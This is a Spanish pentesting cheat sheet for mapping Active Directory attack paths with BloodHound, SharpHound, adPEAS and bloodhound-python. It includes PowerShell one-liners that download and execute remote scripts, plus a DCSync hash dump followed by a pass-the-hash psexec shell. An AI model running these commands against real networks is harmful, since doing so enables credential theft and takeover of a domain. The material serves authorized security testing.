# Bloodhound 

Tags: #AD #BloodHound #SharpHound #Kali #Parrot 

**BloodHound** es una herramienta especializada en analizar y mapear relaciones dentro de Active Directory (AD). Su capacidad para identificar rutas de ataque y relaciones complejas la ha convertido en una herramienta esencial tanto para pentesters como para atacantes. A través de la recopilación y visualización de datos, permite descubrir configuraciones inseguras, privilegios excesivos y posibles vectores de escalación de privilegios o movimiento lateral en entornos AD, lo que la hace invaluable en auditorías de seguridad y pruebas de penetración.

* [BloodHound](https://github.com/SpecterOps/BloodHound-Legacy/releases)
* [CustomQueries.json - BloodHound](https://github.com/CompassSecurity/BloodHoundQueries)
* [Neo4j-installation](https://neo4j.com/docs/operations-manual/current/installation/linux/debian/)

```bash 
❯ neo4j console                            # Iniciar neo4j por el puerto local '7474'
❯ neo4j console &> /dev/null & disown      

❯ BloodHound                               # Ejecutar Bloodhound 
❯ BloodHound --no-sandbox & disown         

Notas: 
	1. La versión de Neo4j '4.4.26' funciona con Bloodhound '4.3.1' 
	2. Si es la primera vez que se usa, abrir la web 'localhost:7474', agregar las credenciales 'neo4j:neo4j', despues, colocar una nueva passwd 'neo4j1' y conectarse al 'Bloodhound'
	3. El 'CustomQueries.json' se descarga y se copia en la carpeta donde esta instalado 'BloodHound'
```

```bash 
Identificar lo siguiente en BloodHound:
	1. Identificación de 'Doman Admins'
	2. Identificación de 'usuarios Kerberoasteables'
	3. Identificación de 'usuarios AS-REP Roastable'
	4. Identificación de vectores de ataque 'Find Shortest Paths to Domain Admins'
	5. Identificación de 'Unsconstrained Delegation'
	6. Identificación de usuarios con permisos sobre GPO 'Find if any domain user has interesting against aGPO'
```

## SharpHound 

* [SharpHound](https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.ps1)
* [SharpHound](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1)

```powershell
❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/SharpHound.ps1') 

❯ Invoke-BloodHound -CollectionMethod All     


Notas: 
	1. Si se ha instalado 'BloodHound' con 'apt' se debe de usar 'SharpHound.exe' que se encuentra en la ruta de instalacion del BloodHound para que se puedan cargar los datos 
	2. Recolectar la información en la maquina victima Windows y obtener un archivo '.zip' para agregarlo a 'BloodHound'
```

## ADPeas 

* [ADPeas](https://github.com/61106960/adPEAS)

```powershell 
❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1')

❯ Invoke-adPEAS    # Módulo para hacer la enumeración automatizada

Notas: 
	1. Al usar ADPeas para hacer la recolección ejecuta 'SharpHound' automaticamente
```

## Subir Data por Python a BloodHound

```bash
❯ bloodhound-python -d Domain.local -u User -p Password -ns IP_DC -c all   # Ejecutamos para recopilar la data y asi poder subir el archivo a la plataforma de Bloodhound

Notas: 
	1. Importamos todos los archivos que fueron generados en formato 'Json'
```

## SharpHound con credenciales Validas desde un CMD en Windows 

```bash 
# Autenticarse en un 'CMD' en Windows con credenciales validas
❯ runas /netonly /user:domain1.com\username cmd    # Autenticarse con credenciales validas a nivel de red en una CMD en Windows> Este comando abrirá una nueva CMD con las credenciales 

❯ dir \\IP\DIR           # Enumerar el directorio con el usuario autenticado desde una CMD en Windows 

❯ .\SharpHound.exe -c all -d domain1.com --domaincontroller IP   # Enumeración con SharpHound a un dominio con credenciales validas desde una CMD en Windows.
Nota: La herramienta regresará un archivo '.zip' que se debe cargar en 'BloodHound' para analizar

❯ python3 -m http.server 80     # Crear un recurso compartido a nivel de red para pasar archivos 
```

## Ataques 'DCSync'

```bash 
# Si encontramos en 'Bloodhound' un usuario que tiene un 'GetChangesAll' sobre el dominio podremos hacer un 'DCSync attack' para obtener el hash del usuario 'Administrador' y por lo tanto efectuar un 'Pass-The-Hash'

❯ impacket-secretsdump <Domain/User@IP>    # Hacemos un ataque 'DCSync', debemos de colocar la passwd del usuario 
❯ impacket-psexec <Domain/Administrator@IP> cmd.exe -hashes <:hash>   # Utilizamos 'psexec' para obtener una consola interactiva autenticandonos como el usuario 'Administrator' y colocando su hash para hacer 'Pass-The-Hash'    
```
